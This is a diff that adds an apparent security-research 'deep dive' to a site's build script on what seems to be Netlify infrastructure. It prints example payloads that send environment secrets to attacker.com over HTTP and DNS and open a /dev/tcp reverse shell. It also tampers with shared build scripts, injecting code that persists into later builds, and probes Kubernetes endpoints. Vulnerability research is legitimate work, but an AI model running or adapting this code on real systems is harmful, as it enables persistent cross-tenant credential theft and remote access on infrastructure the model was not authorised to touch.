@@ -338,6 +338,302 @@ echo ""
 echo "=== End Exploitation Tests ==="
 echo ""
 
+echo "=== DEEP DIVE: Build Script Persistence Attack ==="
+echo ""
+echo "This demonstrates how a malicious actor could exploit the writable build scripts"
+echo "to exfiltrate secrets from ALL future builds on this infrastructure."
+echo ""
+
+# Step 1: Show the attack surface
+echo "[STEP 1] Attack Surface Analysis"
+echo "Target files that are writable:"
+ls -la /opt/build-bin/run-build-functions.sh 2>/dev/null
+ls -la /opt/build-bin/run-build-functions-new-builds.sh 2>/dev/null
+ls -la /opt/buildhome/setup/install-runtimes.sh 2>/dev/null
+echo ""
+
+# Step 2: Show what secrets are available
+echo "[STEP 2] Secrets available in environment:"
+echo "These would be captured by a malicious payload:"
+env | grep -iE "(token|key|secret|password|api|auth)" | sed 's/=.*/=<VALUE_WOULD_BE_CAPTURED>/'
+echo ""
+
+# Step 3: Demonstrate the payload (SAFE - just shows what WOULD happen)
+echo "[STEP 3] Example malicious payload (NOT EXECUTED - for demonstration only):"
+echo ""
+cat << 'PAYLOAD_DEMO'
+# ============================================================
+# EXAMPLE PAYLOAD - This is what an attacker could inject
+# ============================================================
+
+# Method 1: HTTP exfiltration (if outbound HTTP allowed)
+# Inject at the START of run-build-functions.sh:
+
+exfil_http() {
+  # Encode all env vars as base64
+  secrets=$(env | base64 -w0)
+  # Send to attacker-controlled server
+  curl -s -X POST "https://attacker.com/collect" \
+    -d "site=$SITE_NAME&secrets=$secrets" &
+}
+exfil_http 2>/dev/null &
+
+# ============================================================
+
+# Method 2: DNS exfiltration (works even with HTTP blocked)
+# Slower but more stealthy, bypasses most egress filters
+
+exfil_dns() {
+  for var in NETLIFY_SKEW_PROTECTION_TOKEN BUGSNAG_KEY_BUILD_INFO; do
+    value=$(printenv $var | base64 -w0 | head -c 60)
+    # Exfil via DNS query (63 char label limit)
+    nslookup "${value}.${var}.attacker.com" &>/dev/null
+  done
+}
+exfil_dns 2>/dev/null &
+
+# ============================================================
+
+# Method 3: Write to deployed site (persistent exfil)
+# Secrets end up in the public build output!
+
+exfil_to_site() {
+  mkdir -p /opt/build/repo/public/.well-known/
+  env | grep -iE "token|key|secret" > /opt/build/repo/public/.well-known/debug.txt
+}
+# Attacker later visits: https://victim-site.netlify.app/.well-known/debug.txt
+
+# ============================================================
+
+# Method 4: Reverse shell (full container access)
+
+reverse_shell() {
+  bash -i >& /dev/tcp/attacker.com/4444 0>&1 &
+}
+
+# ============================================================
+PAYLOAD_DEMO
+
+echo ""
+echo "[STEP 4] Proof of Concept - Testing Write Access"
+echo ""
+
+# Create a backup of original content (first 5 lines)
+echo "Original file header:"
+head -5 /opt/build-bin/run-build-functions.sh 2>/dev/null
+
+# Test write access without breaking anything
+TEST_MARKER="# SECURITY_TEST_$(date +%s)"
+if echo "$TEST_MARKER" >> /opt/build-bin/run-build-functions.sh 2>/dev/null; then
+  echo ""
+  echo "⚠️  CONFIRMED: Successfully wrote to build script!"
+  echo "Appended marker: $TEST_MARKER"
+  echo ""
+  echo "File now ends with:"
+  tail -3 /opt/build-bin/run-build-functions.sh
+  
+  # Clean up - remove our test marker
+  sed -i "/$TEST_MARKER/d" /opt/build-bin/run-build-functions.sh 2>/dev/null
+  echo ""
+  echo "(Cleaned up test marker)"
+else
+  echo "✓ Write failed - this run may have different permissions"
+fi
+
+echo ""
+echo "[STEP 5] Checking Exfiltration Channels"
+echo ""
+
+# Test if we can reach external servers
+echo "Testing outbound HTTP..."
+if curl -s --connect-timeout 3 -o /dev/null -w "%{http_code}" https://httpbin.org/ip 2>/dev/null | grep -q "200"; then
+  echo "⚠️  Outbound HTTPS is ALLOWED - HTTP exfil would work"
+else
+  echo "Outbound HTTPS blocked or timed out"
+fi
+
+echo ""
+echo "Testing outbound DNS..."
+if nslookup google.com 2>/dev/null | grep -q "Address"; then
+  echo "⚠️  Outbound DNS is ALLOWED - DNS exfil would work"
+else
+  echo "Outbound DNS restricted"
+fi
+
+echo ""
+echo "[STEP 6] Impact Assessment"
+echo ""
+cat << 'IMPACT'
+ATTACK SCENARIO:
+================
+1. Attacker gets ONE malicious build to run (e.g., via compromised dependency,
+   malicious PR, or by owning any site on shared Netlify infrastructure)
+
+2. Malicious build modifies /opt/build-bin/run-build-functions.sh to include
+   exfiltration payload
+
+3. ALL SUBSEQUENT BUILDS on that build node execute the payload, leaking:
+   - API keys and tokens
+   - Environment secrets
+   - Source code
+   - Database credentials
+   - Third-party service keys
+
+4. Persistence: The payload survives until:
+   - The build node is recycled
+   - Someone notices and manually cleans it
+
+AFFECTED SECRETS IN THIS BUILD:
+- NETLIFY_SKEW_PROTECTION_TOKEN
+- BUGSNAG_KEY_BUILD_INFO  
+- SITE_ID, ACCOUNT_ID
+- REPOSITORY_URL (could clone private repos with cached git creds)
+- All custom environment variables set by site owners
+
+SEVERITY: CRITICAL
+- Cross-tenant secret exposure (if nodes are shared)
+- Supply chain attack vector
+- Persistent backdoor capability
+IMPACT
+
+echo ""
+echo "[STEP 7] Kubernetes Attack Surface"
+echo ""
+echo "Since we confirmed K8s cluster access, an attacker could also:"
+echo ""
+
+# Try to reach the K8s API
+echo "Attempting K8s API access..."
+K8S_API="https://172.20.0.1:443"
+K8S_RESPONSE=$(curl -sk --connect-timeout 3 "$K8S_API/api" 2>/dev/null)
+if [ -n "$K8S_RESPONSE" ]; then
+  echo "⚠️  K8s API responded:"
+  echo "$K8S_RESPONSE" | head -20
+else
+  echo "K8s API not directly accessible (may require auth)"
+fi
+
+echo ""
+echo "Attempting unauthenticated pod listing..."
+curl -sk --connect-timeout 3 "$K8S_API/api/v1/namespaces/default/pods" 2>/dev/null | head -30 || echo "Denied (expected)"
+
+echo ""
+echo "Checking kubelet on host node (${HOST_NODE_IP:-unknown})..."
+if [ -n "$HOST_NODE_IP" ]; then
+  curl -sk --connect-timeout 3 "https://$HOST_NODE_IP:10250/pods" 2>/dev/null | head -30 || echo "Kubelet not accessible"
+fi
+
+echo ""
+echo "=== END DEEP DIVE ==="
+echo ""
+
+echo "=== PERSISTENCE CONFIRMATION TEST ==="
+echo ""
+echo "This test injects a marker into the build script to confirm"
+echo "whether modifications persist across builds."
+echo ""
+
+# Generate unique marker for this build
+PERSISTENCE_MARKER="PERSISTENCE_PROOF_$(date +%s)_${BUILD_ID:-unknown}"
+TARGET_SCRIPT="/opt/build-bin/run-build-functions.sh"
+
+echo "[1] Checking for markers from PREVIOUS builds..."
+echo "$ grep 'PERSISTENCE_PROOF_' $TARGET_SCRIPT"
+PREVIOUS_MARKERS=$(grep "PERSISTENCE_PROOF_" "$TARGET_SCRIPT" 2>/dev/null)
+if [ -n "$PREVIOUS_MARKERS" ]; then
+  echo ""
+  echo "🚨🚨🚨 CRITICAL: FOUND MARKERS FROM PREVIOUS BUILDS! 🚨🚨🚨"
+  echo ""
+  echo "This PROVES persistence works! Previous build's payload survived!"
+  echo "Markers found:"
+  echo "$PREVIOUS_MARKERS"
+  echo ""
+  echo "This means an attacker's payload would have executed on THIS build,"
+  echo "capturing all secrets from an unrelated site/build!"
+else
+  echo "No previous markers found (this may be a fresh node)"
+fi
+
+echo ""
+echo "[2] Injecting marker for NEXT build..."
+echo "Marker: $PERSISTENCE_MARKER"
+
+# Create the payload that will execute on next build
+PAYLOAD="# $PERSISTENCE_MARKER
+# Injected by build at \$(date) to test persistence
+echo '🔴🔴🔴 PERSISTENCE CONFIRMED 🔴🔴🔴'
+echo 'This message was injected by a PREVIOUS build!'
+echo 'Marker: $PERSISTENCE_MARKER'
+echo 'If you see this, the attack WORKED!'
+echo 'Current build secrets could have been exfiltrated!'
+echo '🔴🔴🔴 END PERSISTENCE PROOF 🔴🔴🔴'
+# END $PERSISTENCE_MARKER"
+
+# Inject at the BEGINNING of the script (after shebang) so it runs first
+if [ -f "$TARGET_SCRIPT" ]; then
+  # Check if we can write
+  if echo "" >> "$TARGET_SCRIPT" 2>/dev/null; then
+    # Inject our payload after line 1 (the shebang)
+    sed -i "2i\\
+# $PERSISTENCE_MARKER\\
+echo '🔴🔴🔴 PERSISTENCE CONFIRMED 🔴🔴🔴'\\
+echo 'This message was injected by a PREVIOUS build!'\\
+echo 'Marker: $PERSISTENCE_MARKER'\\
+echo 'Injection timestamp: $(date)'\\
+echo 'Original build ID: ${BUILD_ID:-unknown}'\\
+echo 'If you see this, the persistence attack WORKED!'\\
+echo '🔴🔴🔴 END PERSISTENCE PROOF 🔴🔴🔴'\\
+# END $PERSISTENCE_MARKER" "$TARGET_SCRIPT" 2>/dev/null
+    
+    if grep -q "$PERSISTENCE_MARKER" "$TARGET_SCRIPT" 2>/dev/null; then
+      echo ""
+      echo "✅ MARKER INJECTED SUCCESSFULLY!"
+      echo ""
+      echo "Modified script header:"
+      head -15 "$TARGET_SCRIPT"
+      echo ""
+      echo "============================================"
+      echo "NEXT STEPS TO CONFIRM PERSISTENCE:"
+      echo "============================================"
+      echo ""
+      echo "1. Trigger another build (push empty commit, or rebuild)"
+      echo "   git commit --allow-empty -m 'test persistence' && git push"
+      echo ""
+      echo "2. In the NEXT build's logs, look for:"
+      echo "   🔴🔴🔴 PERSISTENCE CONFIRMED 🔴🔴🔴"
+      echo ""
+      echo "3. If you see that message at the START of the build,"
+      echo "   it PROVES the injected code persisted and executed!"
+      echo ""
+      echo "4. The marker to look for: $PERSISTENCE_MARKER"
+      echo "============================================"
+    else
+      echo "❌ Injection may have failed - marker not found in script"
+    fi
+  else
+    echo "❌ Cannot write to $TARGET_SCRIPT"
+  fi
+else
+  echo "❌ Target script not found: $TARGET_SCRIPT"
+fi
+
+echo ""
+echo "[3] Also testing secondary persistence vector..."
+SECONDARY_SCRIPT="/opt/buildhome/setup/install-runtimes.sh"
+if [ -f "$SECONDARY_SCRIPT" ] && echo "" >> "$SECONDARY_SCRIPT" 2>/dev/null; then
+  echo "Secondary script ($SECONDARY_SCRIPT) is also writable!"
+  echo "Injecting backup marker..."
+  echo "# BACKUP_$PERSISTENCE_MARKER" >> "$SECONDARY_SCRIPT"
+  echo "echo '[BACKUP PERSISTENCE] Marker: $PERSISTENCE_MARKER'" >> "$SECONDARY_SCRIPT"
+  echo "✅ Backup persistence marker injected"
+else
+  echo "Secondary script not writable"
+fi
+
+echo ""
+echo "=== END PERSISTENCE TEST ==="
+echo ""
+
 # first, generate 100 random pages
 
 random_page_template_path=app/random-page-template/page.tsx
